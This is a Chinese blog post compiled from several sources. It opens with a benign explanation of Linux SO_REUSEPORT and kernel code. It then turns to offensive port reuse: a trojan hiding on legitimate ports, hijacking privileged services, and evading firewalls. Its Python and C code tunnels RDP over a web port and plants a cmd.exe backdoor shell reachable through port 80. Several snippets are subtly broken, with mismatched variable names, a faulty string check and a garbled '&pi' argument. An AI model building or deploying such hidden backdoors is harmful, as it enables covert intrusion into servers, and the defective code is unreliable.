---
title: SO_REUSEPORT 端口复用
layout: post
category: linux
author: 夏泽民
---
SO_REUSEPORT 套接字选项
从 Linux 3.9内核版本之后Linux网络协议栈开始支持 SO_REUSEPORT 套接字选项，这个新的选项允许一个主机上的多个套接字绑定到同一个端口上，它的目的是提高运行在多核CPU上的多线程网络服务应用的处理性能。

他的使用也非常简单，如果多个进程或者线程都设置了下面这个选项，则他们可以同时绑定到同一个端口上：

int sfd = socket(domain, socktype, 0);

int optval = 1;
setsockopt(sfd, SOL_SOCKET, SO_REUSEPORT, &optval, sizeof(optval));

bind(sfd, (struct sockaddr *) &addr, addrlen);
只要第一个进程在绑定端口时设置了这个选项，则其他进程也可以通过设置这个选项来绑定到同一个端口上。 要求第一个进程必须设置 SO_REUSEPORT 这个选项的原因是防止端口劫持–一些流氓进程通过绑定正在被使用的端口上，来获取其进程接收到的连接请求和数据。为了防止其他不必要的进程通过 SO_REUSEPORT 选项劫持端口，所有之后绑定这个端口的进程都需要设置和第一个进程相同的 user ID 。

TCP和UDP都可以使用 SO_REUSEPORT 选项。对于TCP它允许多个套接字监听同一个端口号，这样每个线程都可以调用 accept() 来处理连接， 避免了传统多线程服务中通常使用一个单一进程处理连接请求，而这个单一进程很可能会成为整个系统的瓶颈。 传统多线程服务中的另一种处理方法是多个线程或者进程对同一个套接字循环调用 accept() 函数处理连接请求，形式如下：

while (1) {
    new_fd = accept(...);
    process_connection(new_fd);
}
这种处理方式也会有一个问题：多个线程之间不能均衡的处理请求，有些线程处理了大量请求，有些线程处理了少量请求，这种不均衡会降低多核CPU的利用率。 而 SO_REUSEPORT 会更加均衡的分发请求到不同线程或者进程上。

SO_REUSEPORT 选项分发数据包的方法是计算对端IP、端口加上本地IP、端口这四个值的哈希值，通过这个哈希值将数据包分发到不同进程上。 这样就可以保证同一个连接的数据包都被分发到同一个进程中去处理。

SO_REUSEPORT 套接字选项在内核中的实现
这里只看UDP协议的实现， 当设置了 SO_REUSEPORT 套接字选项之后，绑定在同一个端口号的套接字在内核中会形成一个数组，保存在 sock_reuseport 结构体中， 在调用 bind() 函数时，会调用到 /net/core/sock_reuseport.c 文件中的 reuseport_add_sock 函数，此函数用来将当前套接字添加到数组中。

/* /include/net/sock_reuseport.h */
struct sock_reuseport {
	struct rcu_head		rcu;

	u16			max_socks;	/* length of socks */
	u16			num_socks;	/* elements in socks */
	struct bpf_prog __rcu	*prog;		/* optional BPF sock selector */
	struct sock		*socks[0];	/* 绑定在同一个端口号的套接字指针数组 */
};
在这篇文章中 Linux协议栈–UDP协议的发送和接收 我们说过当UDP数据到达IP层之后，会调用 __udp4_lib_rcv 函数将数据包存放到UDP的数据接收缓冲区中。在存放之前会调用 __udp4_lib_lookup_skb 函数找到这个数据包对应的 sock 。最终会调用 __udp4_lib_lookup 函数进行实际的查找工作：

struct sock *__udp4_lib_lookup(struct net *net, __be32 saddr,
		__be16 sport, __be32 daddr, __be16 dport, int dif,
		int sdif, struct udp_table *udptable, struct sk_buff *skb)
{
    ...
begin:
	result = NULL;
	badness = 0;
    /* 遍历链表 */
	sk_for_each_rcu(sk, &hslot->head) {
        /* 根据五元组等信息来进行匹配 */
		score = compute_score(sk, net, saddr, sport,
				      daddr, hnum, dif, sdif, exact_dif);
		if (score > badness) {
            /* 匹配到之后，判断是否设置了 SO_REUSEPORT 选项 */
			if (sk->sk_reuseport) {
                /* 根据源端口、IP和接收端口、IP这四个值计算一个哈希值 */
				hash = udp_ehashfn(net, daddr, hnum,
						   saddr, sport);
                /* 根据这个哈希值，将数据包分发到对应的sock上 */
				result = reuseport_select_sock(sk, hash, skb,
							sizeof(struct udphdr));
				if (result)
					return result;
			}
			result = sk;
			badness = score;
		}
	}
	return result;
}
找到对应的 sock 之后，调用 udp_queue_rcv_skb 函数将数据包存放到此套接字的缓冲区中，之后调用 sk->sk_data_ready(sk) 函数指针，此函数指针在创建套接字的时候初始化为 sock_def_readable 函数。这个函数会将对应的进程唤醒，来接收数据包。

static void sock_def_readable(struct sock *sk)
{
	struct socket_wq *wq;

	rcu_read_lock();
	wq = rcu_dereference(sk->sk_wq);
	if (skwq_has_sleeper(wq))
		wake_up_interruptible_sync_poll(&wq->wait, EPOLLIN | EPOLLPRI |
						EPOLLRDNORM | EPOLLRDBAND);
	sk_wake_async(sk, SOCK_WAKE_WAITD, POLL_IN);
	rcu_read_unlock();
}
https://www.codercto.com/a/26302.html
<!-- more -->
端口复用原理&&源码

原理：在WINDOWS的SOCKET服务器应用的编程中，如下的语句或许比比都是：

　　s=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);

　　saddr.sin_family = AF_INET;

　　saddr.sin_addr.s_addr = htonl(INADDR_ANY);

　　bind(s,(SOCKADDR *)&saddr,sizeof(saddr));

　　其实这当中存在在非常大的安全隐患，因为在winsock的实现中，对于服务器的绑定是可以多重绑定的，在确定多重绑定使用谁的时候，根据一条原则是谁的指定最明确则将包递交给谁，而且没有权限之分，也就是说低级权限的用户是可以重绑定在高级权限如服务启动的端口上的,这是非常重大的一个安全隐患。

　　这意味着什么？意味着可以进行如下的攻击：

　　1。一个木马绑定到一个已经合法存在的端口上进行端口的隐藏，他通过自己特定的包格式判断是不是自己的包，如果是自己处理，如果不是通过127.0.0.1的地址交给真正的服务器应用进行处理。

　　2。一个木马可以在低权限用户上绑定高权限的服务应用的端口，进行该处理信息的嗅探，本来在一个主机上监听一个SOCKET的通讯需要具备非常高的权限要求，但其实利用SOCKET重绑定，你可以轻易的监听具备这种SOCKET编程漏洞的通讯，而无须采用什么挂接，钩子或低层的驱动技术（这些都需要具备管理员权限才能达到）

　　3。针对一些的特殊应用，可以发起中间人攻击，从低权限用户上获得信息或事实欺骗，如在guest权限下拦截telnet服务器的23端口，如果是采用NTLM加密认证，虽然你无法通过嗅探直接获取密码，但一旦有admin用户通过你登陆以后，你的应用就完全可以发起中间人攻击，扮演这个登陆的用户通过SOCKET发送高权限的命令，到达入侵的目的。

　　4.对于构建的WEB服务器，入侵者只需要获得低级的权限，就可以完全达到更改网页目的，很简单，扮演你的服务器给予连接请求以其他信息的应答，甚至是基于电子商务上的欺骗，获取非法的数据。　

　　其实，MS自己的很多服务的SOCKET编程都存在这样的问题，telnet,ftp,http的服务实现全部都可以利用这种方法进行攻击，在低权限用户上实现对SYSTEM应用的截听。包括W2K+SP3的IIS也都一样，那么如果你已经可以以低权限用户入侵或木马植入的话，而且对方又开启了这些服务的话，那就不妨一试。并且我估计还有很多第三方的服务也大多存在这个漏洞。

　　解决的方法很简单，在编写如上应用的时候，绑定前需要使用setsockopt指定SO_EXCLUSIVEADDRUSE要求独占所有的端口地址，而不允许复用。这样其他人就无法复用这个端口了。

int setsockopt(int sockfd, int level, int optname,

const void *optval, socklen_t optlen);//设置套接口的选项

SO_BROADCAST BOOL 允许套接口传送广播信息。

　　SO_DEBUG BOOL 记录调试信息。

　　SO_DONTLINER BOOL 不要因为数据未发送就阻塞关闭操作。设置本选项相当于将SO_LINGER的l_onoff元素置为零。

　　SO_DONTROUTE BOOL 禁止选径；直接传送。

　　SO_KEEPALIVE BOOL 发送“保持活动”包。

　　SO_LINGER struct linger FAR* 如关闭时有未发送数据，则逗留。

　　SO_OOBINLINE BOOL 在常规数据流中接收带外数据。

　　SO_RCVBUF int 为接收确定缓冲区大小。

　　SO_REUSEADDR BOOL 允许套接口和一个已在使用中的地址捆绑（参见bind()）。

　　SO_SNDBUF int 指定发送缓冲区大小。

　　TCP_NODELAY BOOL 禁止发送合并的Nagle算法。

　　setsockopt()不支持的BSD选项有：

　　选项名 类型 意义

　　SO_ACCEPTCONN BOOL 套接口在监听。

　　SO_ERROR int 获取错误状态并清除。

　　SO_RCVLOWAT int 接收低级水印。

　　SO_RCVTIMEO int 接收超时。

　　SO_SNDLOWAT int 发送低级水印。

　　SO_SNDTIMEO int 发送超时。

　　SO_TYPE int 套接口类型。

　　IP_OPTIONS 在IP头中设置选项。

针对自己的数据包可以进行处理，如果不是自己的数据包可以利用127.0.0.1进行转发。并把应答的数据包再转发回去。相当于一个中间人。那么此时需要建立一个与127.0.0.1的套接字。判断数据是不是自己的如果是处理不是发送到127.0.0.1。并且将127.0.0.1的返回数据包发送到原地址。

DWORD WINAPI ClientThread(LPVOID lpParam)
　　{
　　SOCKET ss = (SOCKET)lpParam;
　　SOCKET sc;
　　unsigned char buf[4096];
　　SOCKADDR_IN saddr;
　　long num;
　　DWORD val;
　　DWORD ret;
　　//如果是隐藏端口应用的话，可以在此处加一些判断
　　//如果是自己的包，就可以进行一些特殊处理，不是的话通过127.0.0.1进行转发　　
　　saddr.sin_family = AF_INET;
　　saddr.sin_addr.s_addr = inet_addr("127.0.0.1");
　　saddr.sin_port = htons(23);
　　if((sc=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==SOCKET_ERROR)
　　{
　　printf("error!socket failed!\n");
　　return -1;
　　}
　　val = 100;
　　if(setsockopt(sc,SOL_SOCKET,SO_RCVTIMEO,(char *)&val,sizeof(val))!=0)
　　{
　　ret = GetLastError();
　　return -1;
　　}
　　if(setsockopt(ss,SOL_SOCKET,SO_RCVTIMEO,(char *)&val,sizeof(val))!=0)
　　{
　　ret = GetLastError();
　　return -1;
　　}
　　if(connect(sc,(SOCKADDR *)&saddr,sizeof(saddr))!=0)
　　{
　　printf("error!socket connect failed!\n");
　　closesocket(sc);
　　closesocket(ss);
　　return -1;
　　}
　　while(1)
　　{
　　//下面的代码主要是实现通过127。0。0。1这个地址把包转发到真正的应用上，并把应答的包再转发回去。
　　//如果是嗅探内容的话，可以再此处进行内容分析和记录
　　//如果是攻击如TELNET服务器，利用其高权限登陆用户的话，可以分析其登陆用户，然后利用发送特定的包以劫持的用户身份执行。
　　num = recv(ss,buf,4096,0);
　　if(num>0)
　　send(sc,buf,num,0);
　　else if(num==0)
　　break;
　　num = recv(sc,buf,4096,0);
　　if(num>0)
　　send(ss,buf,num,0);
　　else if(num==0)
　　break;
　　}
　　closesocket(ss);
　　closesocket(sc);
　　return 0 ;
　　}
　　
　0x00 开篇

端口复用一直是木马病毒常用的手段,在我们进行安全测试时,有时也是需要端口复用的。

端口复用的一般条件有如下一些：

服务器只对外开放某一端口(80端口或其他任意少量端口)，其他端口全部被封死
为了躲避防火墙
隐藏自己后门
转发不出端口
内网渗透(如：当当前服务器处于内网之中，内网IP为10.10.10.10开放终端登录端口但并不对外网开放，通过外网IP：111.111.111.111进行端口映射并只开放80端口，通过端口复用，直连内网)。
综上，所以为了实现我们的各种小目的，端口复用技术，还是有那么点必要。

本文主要以Windows系统端口复用为主，Linux的端口复用相对于Windows简单和容易实现，不做讨论。

0x01 端口复用要点

端口复用，不能用一般的 socket 套接字直接监听，这样会导致程序自身无法运行，或者相关占用端口服务无法运行，所以，办法暂时只有在本地做些手脚。

***种，端口复用重定向

例：在本地建立两个套接字 sock1 、 scok2 ， scok1 监听80端口，当有连接来到时， Sock2 连接重定向端口，将 Sock1 接收到的数据加以判断并通过 Sock2 转发。这样就能通过访问目标机80端口来连接重定向端口了。

 

第二种，端口复用

例：在本地建立一个监听和本地开放一样的端口如80端口，当有连接来到时，判断是否是自己的数据包，如果是则处理数据，否则不处理，交给源程序。

 

端口复用其实没有大家想象的那么神秘和复杂，其中端口重定向只是利用了本地环回地址127.0.0.1转发接收外来数据，端口复用只是利用了 socket 的相关特性，仅此而已。

TCP的端口复用就一段代码实现，如下

s = socket(AF_INET,SOCK_STREAM,0);  
setsockopt(s,SOL_SOCKET,SO_REUSEADDR,&buf,1));  
server.sin_family=AF_INET;  
server.sin_port=htons(80);  
server.sin_addr.s_addr=htonl(“127.0.0.1”); 
在端口复用技术中最重要的一个函数是 setsockopt() ,这个函数就决定了端口的重绑定问题。

百度百科的解释： setsockopt() 函数，用于任意类型、任意状态套接口的设置选项值。尽管在不同协议层上存在选项，但本函数仅定义了***的“套接口”层次上的选项。

在缺省条件下，一个套接口不能与一个已在使用中的本地地址捆绑(bind()))。但有时会需要“重用”地址。因为每一个连接都由本地地址和远端地址的组合唯一确定，所以只要远端地址不同，两个套接口与一个地址捆绑并无大碍。为了通知套接口实现不要因为一个地址已被一个套接口使用就不让它与另一个套接口捆绑，应用程序可在 bind() 调用前先设置 SO_REUSEADDR 选项。请注意仅在 bind() 调用时该选项才被解释;故此无需(但也无害)将一个不会共用地址的套接口设置该选项，或者在 bind() 对这个或其他套接口无影响情况下设置或清除这一选项。

我们这里要使用的是 socket 中的 SO_REUSEADDR ，下面是它的解释。

SO_REUSEADDR 提供如下四个功能：

SO_REUSEADDR：允许启动一个监听服务器并捆绑其众所周知端口，即使以前建立的将此端口用做他们的本地端口的连接仍存在。这通常是重启监听服务器时出现，若不设置此选项，则bind时将出错。
SO_REUSEADDR：允许在同一端口上启动同一服务器的多个实例，只要每个实例捆绑一个不同的本地IP地址即可。对于TCP，我们根本不可能启动捆绑相同IP地址和相同端口号的多个服务器。
SO_REUSEADDR：允许单个进程捆绑同一端口到多个套接口上，只要每个捆绑指定不同的本地IP地址即可。这一般不用于TCP服务器。
SO_REUSEADDR：允许完全重复的捆绑：当一个IP地址和端口绑定到某个套接口上时，还允许此IP地址和端口捆绑到另一个套接口上。一般来说，这个特性仅在支持多播的系统上才有，而且只对UDP套接口而言(TCP不支持多播)。
一般地，我们需要设置 socket 为非阻塞模式，缘由如果我们是阻塞模式，有可能会导致原有占用端口服务无法使用或自身程序无法使用，由此可见，端口复用使用非阻塞模式是比较保险的。

然而理论事实是需要检验的，当有些端口设置非阻塞时，缘由它的数据传输连续性，可能会导致数据接收异常或者无法接收到数据情况，非阻塞对于短暂型连接影响不大，但对持久性连接可能会有影响，比如3389端口的转发复用，所以使用非阻塞需要视端口情况而定。

阻塞

阻塞调用是指调用结果返回之前，当前线程会被挂起(线程进入非可执行状态，在这个状态下，cpu不会给线程分配时间片，即线程暂停运行)。函数只有在得到结果之后才会返回。

 

非阻塞

非阻塞和阻塞的概念相对应，指在不能立刻得到结果之前，该函数不会阻塞当前线程，而会立刻返回。

 

0x02 端口复用的坑点

在端口复用上可分为 理论 和 实战 ，下面来细细谈谈其中的坑点。

理论：在理论上，我们通过端口复用技术，不会对其他占用此端口的程序或者进程造成影响，因为我们设置了 socket 为 SO_REUSEADDR ，监听 0.0.0.0:80 和监听 192.168.1.1:80 或者监听 127.0.0.1:80 ，他们的地址是不同的，创建了程序或者进程所接收到的流量是相互不影响的，多个线程或进程互不影响。

实战：在Windows中，我们设置了 socket 为 SO_REUSEADDR ，但是无法开启端口复用程序，关闭Web服务程序，端口复用程序可用但Web服务程序又无法使用，只能存在一样，所以端口复用是鸡肋是备胎。哦，不，是千斤顶，换备胎的时候用一下。

在理论上，我们的想法是***的，然而现实确是，你设置了 socket 为 SO_REUSEADDR 并没有想象中的那么大作用。

当程序编写人员 socket 在绑定前需要使用 setsockopt 指定 SO_EXCLUSIVEADDRUSE 要求独占所有的端口地址，而不允许复用。这样其它人就无法复用这个端口了，即使你设置了 socket 为 SO_REUSEADDR 也没有用，程序根本跑不起来。

在windows上测试端口复用时，当启动iis服务，端口复用程序无法正常运行，开启端口复用程序时IIS无法正常使用，后查阅相关文档得知，原因是从IIS6.0开始，微软将网络通信的过程封装在了ring0层，使用了http.sys这个驱动来直接进行网络通信。一个设置了 SO_REUSEADDR 的 socket 总是可以绑定到已经被绑定过的源地址和源端口，不管之前在这个地址和端口上绑定的 socket 是否设置了 SO_REUSEADDR 没有。这种操作对系统的安全性产生了极大的影响，于是乎，Microsoft就加入了另一个 socket 选项: SO_EXECLUSIVEADDRUSE 。设置了 SO_EXECLUSIVEADDRUSE 的 socket 确保一旦绑定成功，那么被绑定的源端口和地址就只属于这一个 socket ，其它的 socket 都不能绑定，甚至他们使用了 SO_REUSEADDR 请求端口复用也没用(当然你也可以修改iis的监听地址或者注入 http.sys 驱动，不过这在实战中不太现实)。

在这其中，也有例外，比如apache和其他运行在应用层上的服务器中间件，在他们开放的端口上是可以进行端口复用的，不过这样，端口复用的范围就小了许多。

然而你们以为事实上就这样了吗?NO!NO!NO!

端口的流量是通过协议完成的，一旦多个协议通过一个端口，流量就只会流向一个连接，流量流向***一个(***一个)建立连接的 socket ,其他的 socket 可能会连接WAIT，等待数据连接中断或者完成数据传输后正常退出，而另外一个连接就会阻塞而无法使用，所以应了那句中国谚语“一山不容二虎”(用分流数据转发这样发生的几率会小一些)。

数据分流的话，和 burp 和 Fiddler 的原理一样，采用代理中转的方式进行中间人转发，这样就既可以保证端口的复用，又可以保证数据的完整性。

绕过这些坑点的方法有很多的思路，举几个例子

本地端口代理中转转发
Hook注入
驱动注入
绕过方法不在本文讨论范围内。^__^

0x03 端口复用过程

原理和坑点讲完了，还是来讲一下端口复用的具体细节吧(即使现在我们知道了端口复用的尿性)

实验说明：本文实验均在理论试验中，所有服务中间件均在系统应用层运行。

目前绑定端口复用有两种：

复用端口重定向
复用端口
(一)复用端口重定向

使用条件：

原先存在80端口，并且监听80端口，需要复用80端口重定向到3389(其他任意)端口

准备环境：

这里我用jspstudy搭建一个网页服务器，用虚拟机模拟外部环境

Windows7服务器：IP：192.168.1.8，开放80端口，3389端口
Win2008 虚拟机：IP：192.168.19.130
我们开启服务器并查看开放的端口，可以看到我们开放了80端口和3389端口

 

我们现在启动端口复用工具，看看网页是否正常

 

接着win2008服务器192.168.19.130打开远程桌面连接器连接192.168.1.8的80端口

 

 

可以看到，我们成功的连接到了192.168.1.8的3389端口

(二)复用端口

使用条件：

原先存在80端口，并且监听80端口，需要复用80端口为23(其他任意)端口

准备环境：

这里我用jspstudy搭建一个网页服务器，用虚拟机模拟外部环境

Windows7服务器：IP：192.168.1.8，开放80端口
Win2008虚拟机：IP：192.168.19.130
这里的端口复用是模拟一个cmd后门，当外部IP：192.168.19.130 telnet本地IP：192.168.1.8时，反弹一个cmsdshell过去。

启动端口复用工具，telnet连接192.168.1.8的80端口

 

 

可以看到我们成功得到了一个cmd shell的会话。

好了，具体的理论和坑点和实战我们都做了，那么下面开始我们的源码分析。

0x04 端口复用源码分析

(一)：复用端口重定向

目的：原先存在80端口，并且监听80端口，22，23，3389等端口复用80端口

复用端口重定向的实现

(1)外部IP连本地IP : 192.168.2.1=>192.168.1.1:80=>127.0.0.1:3389
(2)本地IP转外部IP : 127.0.0.1:3389=>192.168.1.1:80=>192.168.2.1
首先外部 IP(192.168.2.1) 连接本地 IP(192.168.1.1) 的 80 端口,由于本地 IP(192.168.1.1) 端口复用绑定了 80 端口，所以复用绑定端口监听到了外部 IP(192.168.2.1) 地址流量，判断是否为HTTP流量，如果是则发送回本地 80 端口，否则本地 IP(192.168.1.1) 地址连接本地 ip(127.0.0.1) 的 3389 端口，从本地 IP(127.0.0.1) 端口 3389 获取到的流量由本地 IP(192.168.1.1) 地址发送到外部 IP(192.168.2.1) 地址上，这个过程就完成了整个端口复用重定向。

我们用python代码解释，如下:

复制代码
#coding=utf-8 
 
import socket 
import sys 
import select 
 
host='192.168.1.8' 
port=80 
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) 
s.setsockopt( socket.SOL_SOCKET, socket.SO_REUSEADDR, 1 )  
s.bind((host,port)) 
s.listen(10) 
 
S1=socket.socket(socket.AF_INET,socket.SOCK_STREAM) 
S1.connect(('127.0.0.1',3389)) 
print "Start Listen 80 =>3389....." 
while 1: 
    infds,outfds,errfds=select.select([s,],[],[],5) #转发3389需去除 
    if len(infds)!=0:#转发3389需去除 
        conn,(addr,port)=s.accept() 
        print '[*] connected from ',addr,port 
        data=conn.recv(4096) 
        S1.send(data) 
        recv_data=s1.recv(4096) 
        conn.send(recv_data) 
print '[-] connected down', 
S1.close() 
s.close() 
复制代码
首先我们创建了两个套接字 s 和 s1 ， s 绑定 80 端口，其中 setsockopt 用到了 socket.SO_REUSEADDR 以达到端口复用目的， s1 连接本地 3389 端口， s1 在这里起到了数据中转的作用， select 是我们用来处理阻塞问题的，不过在这里这段代码是有点问题的，这个问题在前文说过， 3389 端口能够连上,但是数据传输会中断，我们需要开启多线程来保证数据的连续性传输并取消掉 select 。

那么如果要区分两者数据呢?

我们只需要加上一个判断(怎么判断数据标头可以自定义)，或者判断自己的标记头。

复制代码
if 'GET' or ‘POST’ in data: 
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) 
    s.connect(('127.0.0.1',80)) 
    s.send(data) 
    bufer='' 
    while 1: 
       recv_data=s.recv(4096) 
       bufer += recv_data 
       if len(recv_data)==0: 
          break 
复制代码
 

我们把不是我们的数据包中转发给本地环回地址的 80 端口http服务器。

以下为C语言实现代码，如下：

和python的代码一样，首先我们绑定本地监听复用的 80 端口，其中监听的IP可能会出现问题，那么我们可以换成 192.168.1.1 ， 127.0.0.1 都是可以的，这里不能用 select 来处理阻塞，会出问题的，所以我们去掉，***创建个线程来进行数据传输交互。

复制代码
 //初始化操作 
    saddr.sin_family = AF_INET; 
    saddr.sin_addr.s_addr = inet_addr("0.0.0.0"); 
    saddr.sin_port = htons(80); 
    if ((server_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == SOCKET_ERROR) 
    { 
        printf("[-] error!socket failed!//n"); 
        return (-1); 
    } 
    //复用操作 
    if (setsockopt(server_sock, SOL_SOCKET, SO_REUSEADDR, (char *)&val, sizeof(val)) != 0) 
    { 
        printf("[-] error!setsockopt failed!//n"); 
        return -1; 
    } 
    //绑定操作 
    if (bind(server_sock, (SOCKADDR *)&saddr, sizeof(saddr)) == SOCKET_ERROR) 
    { 
        ret = GetLastError(); 
        printf("[-] error!bind failed!//n"); 
        return -1; 
    } 
    //监听操作 
    listen(server_sock, 2); 
 
    while (1) 
    { 
        caddsize = sizeof(scaddr); 
        server_conn = accept(server_sock, (struct sockaddr *)&scaddr, &caddsize); 
        if (server_conn != INVALID_SOCKET) 
        { 
            cthd = CreateThread(NULL, 0, ClientThread, (LPVOID)server_conn, 0, &tid); 
            if (cthd == NULL) 
            { 
                printf("[-] Thread Creat Failed!//n"); 
                break; 
            } 
        } 
        CloseHandle(cthd); 
    } 
    closesocket(server_sock); 
    WSACleanup(); 
    return 0; 
} 
复制代码
 

这里有一个 ClientThread() 函数，这个函数是需要在 main() 函数里面调用的(见如上代码)，这里创建一个套接字来连接本地的 3389 端口，用 while 循环来处理复用交互的数据， 80 端口监听到的数据发送到本地的 3389 端口上面去，从本地的 3389 端口读取到的数据用 80 端口的套接字发送出去，这就构成了端口复用的重定向，当然在这个地方可以像上面python代码一样，在中间加一个数据判断条件，从而保证数据流向的完整和可靠和精准性。

复制代码
//创建线程 
DWORD WINAPI ClientThread(LPVOID lpParam) 
{ 
    //连接本地目标3389 
    saddr.sin_family = AF_INET; 
    saddr.sin_addr.s_addr = inet_addr("127.0.0.1"); 
    saddr.sin_port = htons(3389); 
    if ((conn_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == SOCKET_ERROR) 
    { 
        printf("[-] error!socket failed!//n"); 
        return -1; 
    } 
    val = 100; 
    if (setsockopt(conn_sock, SOL_SOCKET, SO_RCVTIMEO, (char *)&val, sizeof(val)) != 0) 
    { 
        ret = GetLastError(); 
        return -1; 
    } 
    if (setsockopt(ss, SOL_SOCKET, SO_RCVTIMEO, (char *)&val, sizeof(val)) != 0) 
    { 
        ret = GetLastError(); 
        return -1; 
    } 
    if (connect(conn_sock, (SOCKADDR *)&saddr, sizeof(saddr)) != 0) 
    { 
        printf("[-] error!socket connect failed!//n"); 
        closesocket(conn_sock); 
        closesocket(ss); 
        return -1; 
    } 
    //数据交换处理 
    while (1) 
    { 
        num = recv(ss, buf, 4096, 0); 
        if (num > 0){ 
            send(conn_sock, buf, num, 0); 
        } 
        else if (num == 0) 
        { 
            break; 
        } 
        num = recv(conn_sock, buf, 4096, 0); 
        if (num > 0) 
        { 
            send(ss, buf, num, 0); 
        } 
        else if (num == 0) 
        { 
            break; 
        } 
    } 
    closesocket(ss); 
    closesocket(conn_sock); 
    return 0; 
} 
复制代码
 

还有一种方法就是端口转发达到端口复用的效果，我们用lcx等端口转发工具也可以实现同等效果,不过隐蔽性就不是很好了，不过还是提一下吧。

下面是 python 代码实现 lcx 的端口转发功能,由于篇幅限制,就只写出核心代码。

首先定义两个函数，一个 server 端和一个 connect 端， server 用于绑定端口， connect 用于连接转发端口。

这里的 select 来处理套接字阻塞问题， get_stream() 函数用于交换 sock 流对象,这样做的好处是双方分工明确,避免混乱, ex_stream() 函数用于流对象的数据转发。 Connect() 函数里多了个时间控制，控制连接超时和等待连接，避免连接出错异常。

然而事实是 select 控制阻塞后， 3389 端口的连接无法正常通信，其他短暂性连接套接字不受影响。

复制代码
def get_stream(flag): 
   pass 
def ex_stream(host, port, flag, server1, server2): 
   pass 
def server(port, flag): 
    host = '0.0.0.0' 
    server = create_socket() 
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
    server.bind((host, port)) 
    server.listen(10) 
    while True: 
         infds,outfds,errfds=select.select([server,],[],[],5) 
        if len(infds)!= 0:  
            conn, addr = server.accept() 
            print ('[+] Connected from: %s:%s' % (addr,port)) 
            streams[flag] = conn 
            server_sock2 = get_stream(flag)  
            ex_stream(host, port, flag, conn, server_sock2) 
 
def connect(host, port, flag): 
    connet_timeout = 0 
    wait_time = 30 
    timeout = 5 
    while True: 
        if connet_timeout > timeout: 
            streams[flag] = 'Exit' 
            print ('[-] Not connected %s:%i!' % (host,port)) 
            return None 
        conn_sock = create_socket() 
        try: 
            conn_sock.connect((host, port)) 
        except Exception, e: 
            print ('[-] Can not connect %s:%i!' % (host, port)) 
            connet_timeout += 1 
            time.sleep(wait_time) 
            continue 
 
        print "[+] Connected to %s:%i" % (host, port) 
        streams[flag] = conn_sock 
        conn_sock2 = get_stream(flag)  
        ex_stream(host, port, flag, conn_sock, conn_sock2) 
复制代码
 

(一)：端口复用

端口复用的原理是与源端口占用程序监听同一端口，当复用端口有数据来时，我们可以判断是否是自己的数据包，如果是自己的，那么就自己处理，否则把数据包交给源端口占用程序处理。

在这里有个问题就是，如果你不处理数据包的归属问题的话，那么这个端口就会被端口复用程序占用，从而导致源端口占用程序无法工作。

外部IP：192.168.2.1=>192.168.1.1:80=>run(data)
内部IP：return(data)=>192.168.1.1:80=>192.168.2.1
代码以cmd后门为例，我们还是先创建一个TCP套接字

listenSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0); 
设置 socket 可复用 SO_REUSEADDR

BOOL val = TRUE; 
    setsockopt(listenSock, SOL_SOCKET, SO_REUSEADDR, (char*)&val, sizeof(val)); 
设置IP和复用端口号，IP和端口号视情况而定。

sockaddr_in sockaaddr; 
   sockaaddr.sin_addr.s_addr = inet_addr("192.168.1.8"); 
   sockaaddr.sin_family = AF_INET; 
   sockaaddr.sin_port = htons(80); 
设置反弹的程序，以 cmd.exe 为例，首先创建窗口特性并初始化为 CreateProcess() 创建进程做准备，当 cmd.exe 的进程创建成功后，以 socket 进行数据通信交换，这里还可以换成其他程序,比如 Shellcode 小马接收器、写入文件程序、后门等等。

STARTUPINFO si; 
 ZeroMemory(&si, sizeof(si)); 
 si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES; 
 si.hStdError = si.hStdInput = si.hStdOutput = (void*)recvSock; 
 
 char cmdLine[] = "cmd"; 
 PROCESS_INFORMATION pi; 
 ret = CreateProcess(NULL, cmdLine, NULL, NULL, 1, 0, NULL, NULL, &si, π); 
0x05总结

在端口复用技术中，确实有许多的坑点。其实只要我们知道其中的特性，绕过也是不难的。端口复用在Linux系统中我觉得还好，但是端口复用这个技术放到Windows系统中，我觉得端口复用就好像是千斤顶，换备胎的时候可以用下，不可长时间使用
